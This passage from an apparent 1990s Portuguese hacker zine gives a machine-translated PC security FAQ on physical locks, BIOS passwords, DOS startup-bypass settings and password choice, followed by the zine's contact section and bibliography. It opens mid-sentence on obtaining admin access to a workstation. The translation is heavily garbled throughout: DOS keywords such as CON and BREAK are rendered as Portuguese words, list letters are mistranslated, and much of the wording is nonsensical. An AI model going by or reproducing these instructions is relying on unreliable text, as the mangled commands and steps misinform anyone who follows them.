+de consolo) e seleciona as opções para instalar os Serviços de Diretório. Você 
+sido incitado para a contra-senha de Admin enquanto fazendo isto. Isso você 
+pode perseguir para qualquer estação e pode anotar em como usuário Admin, 
+usando a contra-senha que você selecionou. 
+
+* *NOTE: Se Disco Edita é indisponível, qualquer Disco que Edita utilidade com 
+capacidades buscadoras bastarão. 
+
+---------------------------------------------------------------- 
+
+
+3. Construindo um sistema seguro 
+
+3a. Entendendo os Assuntos 
+
+Hackers " potencial " 
+== == == == == == == == == = 
+Depois de ler este FAQ, você revisou sua idéia provavelmente de um 
+PC seguro bastante. Verdade contada, a IBM não projetou o Computador Pessoal 
+com segurança em mente. Atrás em 1980, o objetivo principal deles/delas era 
+adquirir _something_ para comercializar antes de Maçã engoliu toda a parte de 
+mercado. 
+
+Depois de por algum tempo, programas de segurança começaram a emergir isso 
+tentado 
+atravessar este buraco. Estes eram bastante populares, e foi posto em uso 
+por muitas companhias prevenir ' os empregados de curious' de desarrumar com 
+os computadores. 
+
+Porém, modos para evitar estes foram achados programas de segurança depressa. 
+Contanto que sejam projetados computadores para conveniência, e com humanos 
+em mente, acontecerá quase sempre isto. 
+
+Assim, quem são Hackers " potencial "? A resposta é: Qualquer um. Usuários 
+experientes especialmente, mas newbies plano às vezes acham manchas fracas. 
+Isto 
+é não dizer que todo o mundo *is * um hacker. 
+
+Como sempre, prevenção é o melhor medicamento. As seções seguintes 
+negocie com como afiançar seu sistema, ambos por meios físicos e 
+software-baseados. 
+
+
+
+Segurança física 
+== == == == == == == == = 
+Nos dias velhos, atrás quando computadores encheram quartos múltiplos, a 
+segurança de um sistema era basicamente todo física: Fechaduras, segurança 
+guarda, etc. Agora a ênfase trocou longe de segurança física, e está apoiando 
+mais para métodos software-baseados. Porém,  
+em alguns casos, um certo grau de segurança física está em ordem. 
+
+* *If você quer prevenir as pessoas de resetting seu CMOS e  
+tendo acesso os passeios moles, etc. você tem que afiançar o próprio sistema. 
+Isto pode ser feito tendo o computador em um quarto fechado e pode ser deixado 
+só a tela e teclado acessível. Há muitos produtos que o deixaram estendem o 
+alcance de tela e cabos de teclado.  Até mesmo alguns que o deixaram controlam 
+muitos computadores diferentes que usam uma tela.  
+
+* * *To protegem seus dados de disco rígido, eu sugestionaria investindo em um 
+sistema de mídia removível que o " deixa quente-troca " e discos rígidos de 
+fechadura.  O disco rígido poderia ser removido então facilmente (com o *unique 
+* chave) 
+e armazenou em uma caixa forte para prevenir roubo de dados. 
+
+* * *Computer fecha que liga seu computador a uma escrivaninha é bom para 
+desencorajar roubo. 
+
+* * *There também são dispositivos de segurança disponível fez através de 
+companhias como Bloco de Âncora, Lucasey, e outros que completamente incluem o 
+PC.   
+Estes são dispositivos como blocos de lockdown, cabos para monitores, e caixas 
+de metal. Também há dispositivos que cobrem e fecham o disquete  
+e aberturas de CD-ROM.   
+
+Tenha certeza que você testa o computador imediatamente depois destes 
+são instalados dispositivos de lockdown. Em algumas instâncias induziu a tensão 
+na cobertura certas partes podem causar a mau funcionamento. 
+
+* * *You pode comprar dispositivos dos que previnem o PC corda elétrica  
+unplugged sendo ou virou em sem uma chave. 
+
+* * *As uma última medida de segurança, sempre é agradável investir em 
+um pouco de seguro para seu computador. Não voltará seus dados, 
+mas isto *will * lhe dê um pouco de paz de mente. 
+
+
+Segurança software-baseada 
+== == == == == == == == == == == = 
+Debaixo de é uma lista de medidas você pode levar para afiançar métodos 
+baseados para seu software/firmware usando de sistema. Eles são listados em 
+ordem de segurança crescente, segurança tão mínima estaria implementando só 
+opção #1, segurança de máximo estaria implementando #1-8. Detenha 
+mente que implementando quaisquer destes sem implementar todo artigo debaixo 
+disto deixa para possíveis pontos de entrada abre. 
+
+	1. Monte uma contra-senha de BIOS para ambos a tela de Ligação *and * 
+	   tenha acesso ao sistema. 
+		um. Tenha certeza a contra-senha não é facilmente nenhum guessable 
+			(i.e., birthdate, nomeie para trás, etc. é 
+			 facilmente adivinhado) Veja próxima seção. 
+		b. Tenha certeza que a contra-senha é o máximo possível 
+			número de caráter apoiado pelo BIOS. 
+	2. Incapacite disquete que calça as botas em o BIOS de dentro 
+	3. Incapacite Estrada de contorno de arquivos de startup 
+		um. Isto é acabado somando a linha: 
+			SWITCHES=/F /N 
+		   para o arquivo de CONFIG.SYS. 
+		b. Adicionalmente, você poderia querer preceder 
+			todas as declarações no Autoexec.bat 
+			com CTTY NUL, e então tem o TRAPACEIRO de CTTY 
+			como a última linha. Isto previne quebrando 
+			fora de autoexec.bat 
+		c. Se você usa compressão de DriveSpace, some o 
+			linha seguinte para seu arquivo de DRVSPACE.INI: 
+			SWITCHES=/F /N 
+		d. Some a linha: 
+			ROMPA 
+		   Isto reduz o número de chances para o que você tem 
+		   fuja de AUTOEXEC.BAT, tudo entretanto não faz 
+		   apague completamente 
+	4. Monte uma Segurança DOS-baseada TSR 
+		um. Tenha certeza você não pode ter acesso o passeio mole 
+			sem uma contra-senha, e que permite 
+			para escrever-proteção. 
+		b. Tenha certeza permite proteção de contra-senha. 
+	5. Monte um programa de Segurança Windows-baseado 
+		um. Tenha certeza você pode controlar quais características de 
+			Windows você pode limitar ou pode incapacitar. 
+		b. Tenha certeza permite proteção de contra-senha. 
+	6. Instale um programa de filesystem codificado. (i.e., CryptDisk) 
+		um. Isto prevenirá acesso para o computador e 
+			arquivos no disco rígido a menos que a contra-senha 
+			é entrado. Fará seus dados  
+			unaccessible igualam se o disco rígido é  
+			extraído do sistema. 
+	7. Apague os arquivos seguintes: 
+		FORMATO 
+		DELTREE 
+		SUBST 
+		UNA 
+		AUXILIO 
+		RESTABELEÇA 
+		ATTRIB 
+
+
+Contra-senhas 
+== == == == = 
+Contra-senhas geralmente são o vínculo mais fraco na cadeia de segurança. 
+Quando escolhendo uma contra-senha, se lembre destas gorjetas: 
+
+Não escolha algo óbvio. Jure palavras, seu birthdate, 
+tópicos que pertencem ao que você faz and/or seus interesses são é 
+exemplos de contra-senhas RUINS. 
+
+Uma Contra-senha Boa é um que é totalmente fortuito. Escolher uma contra-senha, 
+tente isto: Agarre um dicionário. Feche seus olhos, e sacuda um  
+página fortuita. Com seus olhos ainda fechados, vista seu dedo um  
+mancha fortuita nesta página. Se lembre da palavra, e faça isto novamente.  
+Combine as duas palavras, e junte um número de três-dígito para o fim.  
+Você também poderia querer entremear caráter non-alfanuméricos  
+na contra-senha de modos fortuitos, como uma colisão estranha ou  
+apóstrofe aqui e lá. 
+
+Também, NUNCA escreva sua contra-senha abaixo. Sempre mantenha em sua cabeça. 
+Um simples Posto-isto nota em seu monitor pode derrubar todos o 
+segurança para cima a que você fixou tão meticulosamente! 
+
+Uma contra-senha boa couros de sistemas as contra-senhas de todo o mundo,  
+inclusive os administradores de sistemas. Isto significa que o sys  
+admins não podem contar se os usuários estão pondo em contra-senhas fracas. 
+
+Uma nota final: Quando projetando um sistema de segurança, esteja seguro levar 
+o usuário em conta. Se um sistema é de tal segurança de alto-grau 
+que é um nuisance para usar, as pessoas sempre acharão o preguiçoso  
+modo para fazer isto. (Nota...) 
+
+---------------------------------------------------------------- 
+
+Como entrar em contato
+
+	Chegamos ao fim da versão beta deste zine, eu gostaria de contar com a participação de vocês, sejam crackers, phreakers, hackers ou até mesmo lammers esforçados. Para mandar dicas mande um e-mail para mim com o subject dicas_zine. Não farei assinaturas, porque como já tinha dito estou sem tempo. Mas você encontrará facilmente o número atualizado do zine em minha HP, mesmo que a geocities me dê um take down e a colocarei no ar de novo, em outro endereço, mas colocarei. Para contatos, dicas e outras coisas aí vai meu E-mail:
+
+E-mail: dark_sided@geocities.com
+Home Page: http://www.geocities.com/siliconvalley/peaks/2667/index.html 
+(grande não ?)
+
+Há, como eu já ia me esquecendo, me perdoem qualquer erro de protuguês. A bibliografia está ai embaixo.
+
+Zine nethack
+Manual definitivo de violação a telefones públicos e privados
+Pc-FAQ
+
+Nós somos o poder,
+não poder sem conhecimento.
+
+Cyber Cool.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	
+
+
+
+
+
+
+
+
+
+
+
